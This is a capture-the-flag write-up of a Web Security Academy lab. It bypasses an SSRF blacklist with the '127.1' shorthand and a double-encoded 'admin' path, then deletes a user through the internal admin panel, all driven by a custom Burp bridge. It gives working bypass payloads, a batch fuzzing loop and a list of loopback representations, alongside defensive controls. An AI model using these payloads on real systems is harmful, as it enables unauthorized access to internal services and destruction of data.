---
tags:
  - CTF
  - WebSecurityAcademy
  - writeup
  - ssrf
  - blacklist-bypass
  - url-encoding
  - double-encoding
  - ip-shorthand
  - in-band-ssrf
  - burp-extension
  - cc-bridge
  - tooling-trial
difficulty: Practitioner
platform: Web Security Academy
date: 2026-06-02
status: Solved ✅
bridge_version: 0.1.0
flags:
  flag: notification-labsolved (carlos deleted via SSRF → 127.1/admin)
---

## Lab: SSRF with blacklist-based input filter

**Class:** In-band Server-Side Request Forgery, blacklist filter bypass
**Bridge endpoints used:** `/send`, `/repeat/{id}`
**Bridge endpoints that failed:** none in v0.1 surface (no scanner/collaborator needed — this is the *in-band* SSRF lab; the OAST-driven blind variant would have forced the 501 test)
**Total cc-burp calls:** 23 (1 home + 1 prod page + 1 stock baseline + 2 first probes + 9 batched bypass candidates + 4 disentanglement probes + 3 admin-panel reads + 1 carlos delete + 1 final verify)
**Time to solve:** ~6 minutes wall time
**GUI fallback needed:** No
**Solve chain:** see numbered steps below
**Notable bridge behavior:** First time `/repeat` was used for *exploration* rather than iteration. Nine bypass candidates were fired in a `for label_url in …` shell loop varying the body of `repeat/4`, returning status/length/preview for each in one screen. This is the same primitive that drove 139 sequential calls on the boolean-SQLi lab, used here for parallel-style fuzzing across encoding tricks.

---

# SSRF with blacklist-based input filter — Web Security Academy

## Summary

The shop's product page exposes a stock-check feature that takes a full URL via the `stockApi` form parameter and fetches it server-side. The server has two independent blacklists — one rejecting hostnames matching `localhost` / `127.0.0.1`, and one rejecting URLs containing the string `admin`. Each blacklist runs on the once-decoded form value but the HTTP fetcher subsequently URL-decodes again. The bypass is therefore independent on the two axes:

- **Host filter:** use IP shorthand `127.1`, which the blacklist's substring match misses but the resolver still resolves to `127.0.0.1`.
- **Path filter:** double-URL-encode the leading `a` in `admin` → `%2561dmin`. The application-layer form parser decodes once to `%61dmin` (no literal "admin" present, blacklist passes); the HTTP-client URL parser decodes again on fetch to `admin`.

Combined: `stockApi=http://127.1/%2561dmin/delete?username=carlos` reaches the internal admin panel's delete-user endpoint, removes user `carlos`, and trips the lab-solved marker.

All requests through **CC-Bridge v0.1** via `cc-burp send` and `cc-burp repeat`. No GUI interaction.

---

## Flags

| Marker | Value |
|---|---|
| Lab-solved element | `widgetcontainer-lab-status is-solved` + `<p>Solved</p>` on home page |
| SSRF entry | `POST /product/stock` parameter `stockApi=<url>` |
| Host bypass | `127.1` (compact form of `127.0.0.1`) |
| Path bypass | `%2561dmin` (double-encoded `admin`) |
| Final payload | `http://127.1/%2561dmin/delete?username=carlos` |

---

## Enumeration

```bash
LAB=https://0abb00db043c161b8086db2f00df005b.web-security-academy.net
CC=~/burp-ext/cc-bridge/cc-burp

# 1. Identify the lab
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\"}"
# <title>SSRF with blacklist-based input filter</title>

# 2. Pull a product page, look for any form whose value is a full URL
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/product?productId=1\",\"headers\":{\"Cookie\":\"session=...\"}}"
```

The product page contains:

```html
<form id="stockCheckForm" action="/product/stock" method="POST">
    <select name="stockApi">
        <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1">London</option>
        <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=2">Paris</option>
        <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=3">Milan</option>
    </select>
    <button type="submit" class="button">Check stock</button>
</form>
```

The `stockApi` field is a literal URL. Even though the form supplies a `<select>` with three options, nothing prevents an arbitrary string in the POST body — that's a client-side constraint.

> [!tip]
> **Any form field whose value is a URL is an SSRF candidate.** Look for `<input type="hidden">` redirects, image-proxy `?src=`, PDF/HTML import widgets, OAuth `redirect_uri`, webhook configurators, and avatar-fetch endpoints. The stock-check form here is a textbook example — the field happens to be inside a `<select>` but the wire protocol couldn't care less.

---

## Step 1 — Baseline and naive probes

`POST /product/stock` with the legitimate URL returns `200 / "580"` — the stock count. So the endpoint definitely fetches and returns the body.

```bash
SESS=4r1BepOop1RvftZitJcdKpXIzJed3ESE

# Legit value -> 200, body "580"
$CC send -d "{
  \"method\":\"POST\",\"url\":\"$LAB/product/stock\",
  \"headers\":{\"Content-Type\":\"application/x-www-form-urlencoded\",\"Cookie\":\"session=$SESS\"},
  \"body\":\"stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1\"
}"

# Naive host swaps -> both blocked
$CC send -d "{...stockApi=http%3A%2F%2Flocalhost%2Fadmin}"      # 400 "External stock check blocked for security reasons"
$CC send -d "{...stockApi=http%3A%2F%2F127.0.0.1%2Fadmin}"      # 400 same message
```

Same canned 400 message for both. That message is ambiguous — it could be triggered by the host filter, the path filter, or both — so disentangling them is the first useful step.

---

## Step 2 — Batch-probe bypass candidates via `/repeat`

`/repeat/{id}` lets me vary just the request body of a stored request. ID 4 is the `localhost/admin` probe. From the shell I fire nine candidates in a `for` loop, each varying just `stockApi=`:

```bash
for label_url in \
  "127dot1|http%3A%2F%2F127.1%2Fadmin"                                                        \
  "decimal|http%3A%2F%2F2130706433%2Fadmin"                                                   \
  "octal|http%3A%2F%2F0177.0.0.1%2Fadmin"                                                     \
  "ipv6|http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin"                                                   \
  "zero|http%3A%2F%2F0%2Fadmin"                                                               \
  "UPPER|http%3A%2F%2FLOCALHOST%2Fadmin"                                                      \
  "MixCase|http%3A%2F%2FLocalHost%2Fadmin"                                                    \
  "dblenc-lh|http%3A%2F%2F%256C%256F%2563%2561%256C%2568%256F%2573%2574%2Fadmin"              \
  "dblenc-127|http%3A%2F%2F%2531%2532%2537%252E%2530%252E%2530%252E%2531%2Fadmin"
do
  LABEL=${label_url%%|*}; URL=${label_url#*|}
  $CC 'repeat/4' -d "{\"body\":\"stockApi=$URL\",\"label\":\"$LABEL\"}" | jq -r '"\(.response.status) | \(.response.length)"'
done
```

Result: all nine return `400 | 51` — same blocked message. This rules out simple host-encoding bypasses *while leaving the path-filter explanation alive*: every candidate URL still ended in `/admin`, so if the server is blacklisting that string too, none of these encodings can pass.

> [!important]
> **A negative result on a batch is information, not failure.** Nine bypasses all hit the same canned 400 means the filter is either tight-on-host-and-path OR there's a path-filter alongside the host filter. Don't restart from scratch — change one axis at a time to find out which.

---

## Step 3 — Disentangle: is it the host or the path that's blocked?

Three targeted probes via `/repeat`:

| Probe | Result | Inference |
|---|---|---|
| `http://example.com/` (legit external) | 500 (lab rejects non-target externals) | The fetcher *will* try a non-blacklisted external host |
| `http://stock.weliketoshop.net:8080/admin` (allowed host, blocked path) | 400 blocked | **The string `admin` is independently blacklisted** |
| `http://localhost/` (blocked host, allowed path) | 400 blocked | **The host `localhost` is independently blacklisted** |
| `http://127.1/` (compact loopback, allowed path) | **200, 10736 bytes** | **`127.1` bypasses the host filter** — and the body is the lab's own homepage, served from `127.0.0.1`! |

Two filters confirmed, host bypass found.

> [!note]
> **`127.1` works because POSIX `inet_aton()` accepts shorthand.** A four-octet IP is the *canonical* form, not the only one. `inet_aton(3)` accepts `a`, `a.b`, `a.b.c`, and `a.b.c.d`, treating missing octets as zero-padding from the right. So `127.1` resolves to `127.0.0.1`, `127.0.1` resolves to `127.0.0.1`, and `2130706433` (the 32-bit integer) does too. Whether a given resolver accepts these is implementation-dependent — Java's `InetAddress.getByName` does, browsers vary. The blacklist almost certainly does substring matching on `"localhost"` and `"127.0.0.1"`, and `"127.1"` is neither.

---

## Step 4 — Bypass the path filter via double URL encoding

The application sees the form value once-decoded. So if I send `%2561dmin` on the wire, the application sees `%61dmin` and the blacklist (looking for the literal string `admin`) misses. The HTTP client subsequently URL-parses that string and decodes `%61` back to `a`, fetching `/admin`.

```bash
# 127.1 bypasses host filter; %2561dmin bypasses path filter
$CC 'repeat/4' -d "{\"body\":\"stockApi=http%3A%2F%2F127.1%2F%2561dmin\"}"
```

(Equivalently `http%3A%2F%2F127.1%2F%25%36%31dmin` — three URL-encoded characters `%`, `6`, `1` followed by literal `dmin`. Both decode to `%61dmin` at the application layer.)

Response: **200, 3178 bytes.** Body contains:

```html
<h1>Users</h1>
<div><span>wiener - </span><a href="/admin/delete?username=wiener">Delete</a></div>
<div><span>carlos - </span><a href="/admin/delete?username=carlos">Delete</a></div>
```

Admin panel rendered. The delete endpoint is `GET /admin/delete?username=carlos` (no CSRF, no POST — the same "GET-with-side-effects" pattern this lab series has shown repeatedly).

---

## Step 5 — Fire the delete via SSRF

Same trick, longer path:

```bash
$CC 'repeat/4' -d "{
  \"body\":\"stockApi=http%3A%2F%2F127.1%2F%2561dmin%2Fdelete%3Fusername%3Dcarlos\"
}"
# 302, body length 0
```

The 302 is from the lab's own `/product/stock` wrapper (it redirects after a "successful" stock check); behind it, the inner SSRF call to `/admin/delete` did its job.

Verify:

```bash
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\",\"headers\":{\"Cookie\":\"session=$SESS\"}}"
# is-solved + <p>Solved</p>
```

Lab solved.

---

## Attack Chain Summary

```
GET /                                             -> identify lab; receive session cookie
GET /product?productId=1                          -> find stockApi form with full-URL value
POST /product/stock stockApi=<legit URL>          -> 200 "580" -> SSRF entry confirmed
POST /product/stock stockApi=http://localhost/admin    -> 400 blocked
POST /product/stock stockApi=http://127.0.0.1/admin    -> 400 blocked
batch /repeat × 9 host-bypass candidates                -> all 400 (single-message tells you ?)
/repeat http://example.com/                       -> 500       (external fetcher works)
/repeat http://stock.../admin                     -> 400       (path filter ALSO present)
/repeat http://localhost/                         -> 400       (host filter present)
/repeat http://127.1/                             -> 200 home  (HOST BYPASS: 127.1)
/repeat http://127.1/%2561dmin                    -> 200 admin (PATH BYPASS: double-enc 'a')
/repeat http://127.1/%2561dmin/delete?username=carlos  -> 302   (carlos deleted via SSRF)
GET /                                             -> is-solved + "Solved"
```

---

## Key Concepts

**Blacklists are bug factories because the input domain is much larger than the blocked set.** A blacklist of `["localhost", "127.0.0.1"]` lets through every other representation of the loopback address: `127.1`, `127.0.1`, `2130706433`, `0177.0.0.1`, `[::1]`, `0.0.0.0`, `0`, and the many DNS names that resolve to 127.0.0.1 (including, on the public internet, `localtest.me`, `127.0.0.1.nip.io`, and any attacker-controlled DNS record pointing at loopback). Allowlists work the opposite way — they restrict the input domain to a known-good set — and are vastly more defensible.

**Double URL encoding works when two URL-decode passes happen on opposite sides of the security check.** The form parser decodes wire-format `application/x-www-form-urlencoded` exactly once, producing the application-visible string. If the application's input filter runs at this layer and the URL-fetching HTTP client subsequently re-decodes (most URL parsers do, on the path component), then a single `%25` on the wire becomes a literal `%` post-filter and becomes the *next* encoded char's prefix post-fetch. The fix is to canonicalize *before* filtering — decode aggressively (including percent-decoding, IDN, Unicode normalization, IP-form normalization) and then run the filter on the canonical form.

**The host blacklist and the path blacklist are independent — disentangle them.** When a single canned error covers many distinct failures, change one axis at a time. A negative result on a batch where everything failed is still progress: it eliminates a hypothesis. The four targeted probes in Step 3 are the inflection point of this writeup; they reduced an ambiguous "blocked" to "host AND path are filtered, here's how each behaves independently."

**`/repeat` is useful for exploration, not just iteration.** Lab 2 (blind SQLi) used `/repeat` for a 139-call binary search where the algorithm dictated the sequence. Here `/repeat` is the loop body of a 9-candidate brute force over encoding tricks, then a 4-probe disentanglement, then the actual exploit — all varying just the form body against the same base request. The same primitive serves both workflows because both share the same shape: one base request + many body diffs.

**This lab does not exercise OAST.** Blacklist-based SSRF labs are in-band — the response body of the SSRF-triggering request contains the fetched URL's response. The lab variant that *would* force a Collaborator dependency is "Blind SSRF with out-of-band detection" (Practitioner) or one of the XXE-OAST labs. That lab still hasn't been run in this trial; the 501 fallback for `/collaborator` remains untested in a solve context.

---

## Detection / Defense

| Control | What it Prevents |
|---|---|
| Allowlist of permitted hostnames (e.g. `["stock.weliketoshop.net"]`), not a blacklist | All host-shorthand bypasses |
| Resolve the hostname first, then check the resolved IP against an allowlist *and* against private-address ranges (RFC 1918, loopback, link-local, ULA) | Encoded-IP, DNS-rebinding, and shorthand bypasses |
| Use a dedicated HTTP client with no automatic redirect following (or a redirect-target allowlist) | Open-redirect-into-SSRF chains |
| Canonicalize all URLs to RFC 3986 normal form before any filter check (decode percent-encoding, lowercase host, expand IP shorthand) | Double-encoding and case-permutation bypasses |
| Egress firewall blocking the application server from reaching its own loopback and private ranges | Defense in depth — even if the app bug isn't fixed, the loopback can't be reached |
| Separate "metadata" / admin endpoints on a different bind interface (`127.0.0.1:9000`) accessed only via Unix socket from the local admin tool | Network segmentation eliminates the SSRF attack surface entirely |
| Audit log every URL the SSRF-capable endpoint fetches | Detection — sudden spikes in `127.*` fetches are a strong signal |

---

## Dead Ends

| Approach | Why It Failed / Why I Skipped |
|---|---|
| `2130706433` (decimal IP) | Blocked — the resolver may resolve it but the filter caught it (likely via post-resolution check or a numeric-IP-pattern matcher) |
| `0177.0.0.1` (octal) | Same as above |
| `[::1]` (IPv6) | Blocked |
| `0` / `0.0.0.0` | Blocked |
| `LOCALHOST` / `LocalHost` (case) | Blocked — filter is case-insensitive |
| Double-encoding the **host** instead of the path | Blocked — the host blacklist evidently runs after a normalization pass that re-decodes encoded host octets |
| `/collaborator/new` (would have been needed for blind-SSRF variant) | Not applicable — this lab is in-band |
| `/scan` to auto-detect SSRF | Burp Community returns 501 from CC-Bridge v0.1; not exercised |

---

## Bridge Behavior Notes (CC-Bridge v0.1)

| Endpoint | Calls This Lab | Behavior |
|---|---:|---|
| `POST /send` | 6 | All worked (home, product page, baseline POST, two naive probes, final verification) |
| `POST /repeat/{id}` | 17 | 9 batch bypasses + 4 disentanglement probes + 3 admin-panel reads + 1 final delete. All succeeded. |
| `GET /history/{id}` | 0 | Not needed (responses parsed inline) |
| `GET /history` | 0 | – |
| `POST /decode` | 0 | – |
| `POST /scan` | 0 | – |
| `GET /issues` | 0 | – |
| `POST /collaborator/new` | 0 | – |
| `GET /collaborator/{ctx}` | 0 | – |

**Observation:** This lab's `/repeat`-to-`/send` ratio (17:6) is the highest yet, even higher than the blind-SQLi lab (139:7 for the inner-loop alone, but the SQLi loop was *iteration*). Here `/repeat` is used for *exploration* — fast, cheap variant testing against one base shape. That's a different but equally valid use case, and v0.1 handles both with the same code path.

**No bugs surfaced. Nothing to add to the v0.2 spec from this lab.**

---

## Lessons Learned

1. **A canned error message that covers many causes is a disentanglement opportunity.** Both filters returned the same `"External stock check blocked for security reasons"` 400. Four targeted probes turned an ambiguous "blocked" into two independent filters, each with a known bypass. In a real engagement the same applies to generic "Invalid input" / "Access denied" responses — vary one axis at a time.
2. **IP shorthand is your friend; it almost never appears in blacklists.** `127.1` is one of those bypasses that's easy to forget but a tier above the obvious `127.0.0.1` swap. When testing SSRF or URL-input fields, always carry a list: `127.1`, `127.0.1`, `2130706433`, `017700000001`, `0x7f000001`, `[::1]`, `[::ffff:127.0.0.1]`, `0`, plus DNS-based `localtest.me`, `localhost.cyberis.co.uk`, etc.
3. **Encode the field the blacklist looks for, not the obvious ones.** The lab has TWO filters; you need TWO bypasses, applied to different parts of the URL. Encoding both axes the same way (e.g. double-encoding host and path) is wasted effort if the *host* check happens after re-normalization but the *path* check doesn't. Profile each filter independently.
4. **`/repeat` is the same primitive whether you're iterating or exploring.** v0.1's `/repeat/{id}` doesn't care whether you fire it 139 times in a binary search or 17 times across a hand-built candidate matrix. Both are "vary one part of a base request and read the response," which is also exactly what Burp Repeater is. The bridge has matched Repeater's surface for two labs in a row using only `/send` + `/repeat`.
5. **The OAST 501 test is still unrun.** This lab was supposed to be the SSRF that would force the Collaborator-501 fallback, but it's the in-band variant. The "Blind SSRF with out-of-band detection" lab remains the untested case from the original trial plan. Calling that out in the v0.2 spec rather than pretending coverage.

---

## Tools

| Tool | Purpose |
|---|---|
| `cc-bridge` v0.1 (Burp extension) | HTTP control plane over Burp's Montoya API |
| `cc-burp` (bash wrapper) | `curl` driver, bearer auth, JSON in/out |
| Burp Suite Community 2025.x | Hosts the extension, logs every request in Proxy history |
| `python3` (inline) | Response parsing — extracting status text, lab markers, admin-panel HTML |
| `bash` `for` loop over a `\|`-separated `(label, url)` list | Drove the 9-candidate batch via `/repeat` in a single pipeline |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `cc-bridge` (custom Burp extension, v0.1) | Localhost HTTP control plane over Burp's Montoya API |
| `cc-burp` (bash wrapper) | `curl` driver, bearer auth |
| Burp Suite Community 2025.x | Extension host, proxy, request logger |
| `python3` (inline) | HTML / JSON parsing in shell pipelines |

---

*Web Security Academy — SSRF with blacklist-based input filter | Solved | CC-Bridge v0.1*
